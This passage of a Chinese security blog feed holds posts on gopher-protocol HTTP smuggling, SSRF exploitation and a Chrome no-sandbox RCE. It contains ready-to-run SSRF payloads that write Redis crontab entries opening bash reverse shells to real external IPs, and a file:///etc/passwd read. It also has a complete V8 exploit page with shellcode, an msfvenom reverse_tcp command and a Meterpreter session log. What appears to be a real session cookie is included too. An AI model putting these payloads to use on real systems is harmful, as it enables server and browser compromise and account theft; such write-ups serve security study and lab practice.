e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a</code></p></li></ol><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210506104027urlencode_all.png" alt="img"></p><ol><li> 将URL全编码后的HTTP请求包的字符串附加到`_`后</li></ol><pre><code class="zsh">    curl -v gopher://127.0.0.1/_%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a    ❯ nc -lvv 70      GET / HTTP/1.1    Host: baidu.com    Upgrade-Insecure-Requests: 1    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS    Connection: close</code></pre><p><a id="org085483d"></a></p><h2 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h2><p>必须参数`POST`、`Host`、`Content-Type`、`Content-Length`、、</p><pre><code>POST /v1/pages HTTP/2Host: content-autofill.googleapis.comX-Goog-Encode-Response-If-Executable: base64X-Goog-Api-Key: dummytokenX-Client-Data: COrfygE=Sec-Fetch-Site: noneSec-Fetch-Mode: no-corsSec-Fetch-Dest: emptyUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 9alt=proto</code></pre><ol><li><p> URL全编码HTTP请求包</p></li><li><p> 将URL全编码后的HTTP请求包的字符串附加到`_`后</p></li></ol><pre><code class="zsh">    curl -v gopher://127.0.0.1/_%50%4f%53%54%20%2f%76%31%2f%70%61%67%65%73%20%48%54%54%50%2f%32%0d%0a%48%6f%73%74%3a%20%63%6f%6e%74%65%6e%74%2d%61%75%74%6f%66%69%6c%6c%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%0d%0a%58%2d%47%6f%6f%67%2d%45%6e%63%6f%64%65%2d%52%65%73%70%6f%6e%73%65%2d%49%66%2d%45%78%65%63%75%74%61%62%6c%65%3a%20%62%61%73%65%36%34%0d%0a%58%2d%47%6f%6f%67%2d%41%70%69%2d%4b%65%79%3a%20%64%75%6d%6d%79%74%6f%6b%65%6e%0d%0a%58%2d%43%6c%69%65%6e%74%2d%44%61%74%61%3a%20%43%4f%72%66%79%67%45%3d%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%6f%2d%63%6f%72%73%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%65%6d%70%74%79%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%61%6c%74%3d%70%72%6f%74%6f    ❯ nc -lvv 70    POST /v1/pages HTTP/2    Host: content-autofill.googleapis.com    X-Goog-Encode-Response-If-Executable: base64    X-Goog-Api-Key: dummytoken    X-Client-Data: COrfygE=    Sec-Fetch-Site: none    Sec-Fetch-Mode: no-cors    Sec-Fetch-Dest: empty    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Connection: close    Content-Type: application/x-www-form-urlencoded    Content-Length: 9    alt=proto</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="https://askding.github.io/Kali/Exploit/SSRF.html"/>
    <id>https://askding.github.io/Kali/Exploit/SSRF.html</id>
    <published>2021-04-19T07:03:37.000Z</published>
    <updated>2021-04-19T07:03:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>靶机环境 <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><p><a href="https://github.com/hongriSec/Web-Security-Attack">https://github.com/hongriSec/Web-Security-Attack</a></p><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a></p><p><a href="https://my.oschina.net/u/4588149/blog/4436524">https://my.oschina.net/u/4588149/blog/4436524</a></p><p><a href="https://www.anquanke.com/post/id/197431">https://www.anquanke.com/post/id/197431</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p><a href="https://segmentfault.com/a/1190000021960060">https://segmentfault.com/a/1190000021960060</a></p><p>https://<em>thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de</em>.html</p><p><a href="https://my.oschina.net/u/4588149/blog/4436524">https://my.oschina.net/u/4588149/blog/4436524</a></p><p>能发起对外请求且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）</p><p><a href="https://joner11234.github.io/article/9d7d2c7d.html">https://joner11234.github.io/article/9d7d2c7d.html</a></p><p><a href="https://joner11234.github.io/article/9897b513.html">https://joner11234.github.io/article/9897b513.html</a></p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>工具 ：<a href="http://xip.io/">http://xip.io/</a><br><a href="http://xip.name/">http://xip.name</a></p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>请求中常用参数share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p><p><img src="https://raw.githubusercontent.com/crkmythical/Advanced-Ethical-Hacking-Training/main/Resource/img/20210419144323urlencode_all.png?token=ATXUKW6VO2E3WA5DV2YM6ITAPUTNK" alt="SSRF"></p><pre><code class="zsh"># dict protocol (操作Redis)curl -vvv &#39;dict://127.0.0.1:6379/info&#39;# file protocol (任意文件读取)curl -vvv &#39;file:///etc/passwd&#39;# gopher protocol (一键反弹Bash)   * 注意: 链接使用单引号，避免$变量问题curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</code></pre><h2 id="协议使用"><a href="#协议使用" class="headerlink" title="协议使用"></a>协议使用</h2><p>（1）file： 在有回显的情况下，利用 file 协议可以读取任意内容</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&#39;</code></pre><p>（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/&#39;</code></pre><p>（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。</p><p>反弹shell脚本<code>redis-exp.sh</code></p><pre><code class="zsh">redis-cli -h $1 flushallecho -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.43.20/7777 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save</code></pre><p>在本级上上运行socat查看执行的命令</p><pre><code class="zsh">socat -v tcp-listen:4444,fork tcp-connect:10.211.55.4:6379   # 10.211.55.4 为目标机sh redis-exp.sh</code></pre><p>socat会输出 redis-exp 执行的内容</p><pre><code class="zsh">*3\r$3\rset\r$1\r1\r$65\r-e */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.43.26/7777 0&gt;&amp;1\r*4\r$6\rconfig\r$3\rset\r$3\rdir\r$16\r/var/spool/cron/\r*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$4\rroot\r*1\r$4\rsave\r*1\r$4\rquit\r^C%                       ``````zshcurl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p>（4）http/s：探测内网主机存活</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1&#39;</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><ul><li><input disabled="" type="checkbox"> 针对<code>Host</code></li></ul><pre><code class="zsh">1. http://www.target.com@10.10.10.10  -&gt;10.10.10.102. http://10.10.10.10#www.target.com  -&gt;10.10.10.103. 10。10。10。10                     -&gt; 10.10.10.103. xip.io &amp; xip.name4. tinyurl.com6. ip编码绕过7. [DNS Rebinding](https://github.com/Tr3jer/dnsAutoRebinding)</code></pre><h2 id="SSRF探测内网Redis服务-burp-intruder"><a href="#SSRF探测内网Redis服务-burp-intruder" class="headerlink" title="SSRF探测内网Redis服务(burp intruder)"></a>SSRF探测内网Redis服务(burp intruder)</h2><ol><li><p> 利用http协议对内网进行探测，探测整个内网的存活ip， <code>curl http://www.target.com/ssrf.php?url=http://172.16.x.x</code></p></li><li><p> 利用dict协议获取存活ip的6379端口banner信息 <code>curl http://www.target.com/ssrf.php?url=dict://172.16.55.23:6379/info</code></p></li><li><p>利用crontab写计划任务</p><ol><li><p>URL全编码以下payload</p><pre><code class="zsh">testset 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\n\n\n\n&quot;config set dir /var/spool/root     config set dbfilename crontabsaveaaa</code></pre></li><li><p>使用gopher协议发送payload</p><p>```zsh<br>curl <a href="http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E&%20/dev/tcp/lQip/%EF%BF%BD,%EF%BF%BD%EF%BF%BD%200%3E&1%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20/tmp%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa">http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_%74%65%73%74%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%72%6f%6f%74%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%6c%51%69%70%2f%d1%2c%ef%e3%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%74%6d%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65%0d%0a%0d%0a%61%61%61</a></p></li></ol><p> +OK<br> +OK<br> +OK<br> +OK</p><pre><code>2.  通过[Gopherus](https://github.com/tarunkant/Gopherus)生成RESP格式的payload```zshpython gopherus.py --exploit redisYour gopher link is ready to get Reverse Shell:gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0ABefore sending request plz do `nc -lvp 1234`</code></pre></li></ol><p>工具<br><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a><br><a href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;靶机环境 &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/maste</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome_0day_RCE_no_sandbox</title>
    <link href="https://askding.github.io/Kali/Exploit/Chrome-0day-RCE-no-sandbox.html"/>
    <id>https://askding.github.io/Kali/Exploit/Chrome-0day-RCE-no-sandbox.html</id>
    <published>2021-04-15T07:20:17.000Z</published>
    <updated>2021-04-15T07:20:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="exp-html-sample"><a href="#exp-html-sample" class="headerlink" title="exp.html sample"></a>exp.html sample</h2><pre><code class="javascript">&lt;script&gt;   function gc() &#123;       for (var i = 0; i &lt; 0x80000; ++i) &#123;           var a = new ArrayBuffer();      &#125;  &#125;  // replace the shellcode with cs&#39;payload generate as c format    let shellcode = [          0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,       0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,       0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,       0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,       0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,       0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,       0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,       0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,       0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,       0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,       0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,       0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,       0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,       0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,       0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,       0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,       0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,       0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00       ];   var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);   var wasmModule = new WebAssembly.Module(wasmCode);   var wasmInstance = new WebAssembly.Instance(wasmModule);   var main = wasmInstance.exports.main;   var bf = new ArrayBuffer(8);   var bfView = new DataView(bf);   function fLow(f) &#123;       bfView.setFloat64(0, f, true);       return (bfView.getUint32(0, true));  &#125;   function fHi(f) &#123;       bfView.setFloat64(0, f, true);       return (bfView.getUint32(4, true))  &#125;   function i2f(low, hi) &#123;       bfView.setUint32(0, low, true);       bfView.setUint32(4, hi, true);       return bfView.getFloat64(0, true);  &#125;   function f2big(f) &#123;       bfView.setFloat64(0, f, true);       return bfView.getBigUint64(0, true);  &#125;   function big2f(b) &#123;       bfView.setBigUint64(0, b, true);       return bfView.getFloat64(0, true);  &#125;   class LeakArrayBuffer extends ArrayBuffer &#123;       constructor(size) &#123;           super(size);           this.slot = 0xb33f;      &#125;  &#125;   function foo(a) &#123;       let x = -1;       if (a) x = 0xFFFFFFFF;       var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));       arr.shift();       let local_arr = Array(2);       local_arr[0] = 5.1;//4014666666666666       let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8       arr[0] = 0x1122;       return [arr, local_arr, buff];  &#125;   for (var i = 0; i &lt; 0x10000; ++i)       foo(false);   gc(); gc();  [corrput_arr, rwarr, corrupt_buff] = foo(true);   corrput_arr[12] = 0x22444;   delete corrput_arr;   function setbackingStore(hi, low) &#123;       rwarr[4] = i2f(fLow(rwarr[4]), hi);       rwarr[5] = i2f(low, fHi(rwarr[5]));  &#125;   function leakObjLow(o) &#123;       corrupt_buff.slot = o;       return (fLow(rwarr[9]) - 1);  &#125;   let corrupt_view = new DataView(corrupt_buff);   let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);   let idx0Addr = corrupt_buffer_ptr_low - 0x10;   let baseAddr = (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;   let delta = baseAddr + 0x1c - idx0Addr;   if ((delta % 8) == 0) &#123;       let baseIdx = delta / 8;       this.base = fLow(rwarr[baseIdx]);  &#125; else &#123;       let baseIdx = ((delta - (delta % 8)) / 8);       this.base = fHi(rwarr[baseIdx]);  &#125;   let wasmInsAddr = leakObjLow(wasmInstance);   setbackingStore(wasmInsAddr, this.base);   let code_entry = corrupt_view.getFloat64(13 * 8, true);   setbackingStore(fLow(code_entry), fHi(code_entry));   for (let i = 0; i &lt; shellcode.length; i++) &#123;       corrupt_view.setUint8(i, shellcode[i]);  &#125;   main();&lt;/script&gt;</code></pre><p>MSF</p><pre><code class="zsh">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.26 lport=8080 -f csharp &gt; bb.txt</code></pre><p><img src="../images/chrome.jpg" alt="cs-payload"></p><pre><code class="zsh">python -m SimpleHTTPServer 8888/path/to/chrome.exe -no-sandbox </code></pre><p>msf运行</p><pre><code class="zsh">msf6 &gt; handler -H 192.168.43.26 -P 8080 -p windows/x64/meterpreter/reverse_tcp[*] Payload handler running as background job 0.[*] Started reverse TCP handler on 192.168.43.26:8080msf6 &gt; [*] Sending stage (200262 bytes) to 192.168.43.26[*] Meterpreter session 1 opened (192.168.43.26:8080 -&gt; 192.168.43.26:54937) at 2021-04-16 08:52:41 +0800msf6 &gt;msf6 &gt; jobsJobs====  Id  Name                    Payload                              Payload opts  --  ----                    -------                              ------------  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.43.26:8080msf6 &gt; sessionsActive sessions===============  Id  Name  Type                     Information                              Connection  --  ----  ----                     -----------                              ----------  1         meterpreter x64/windows  ETHANHUNTER78BC\ethan @ 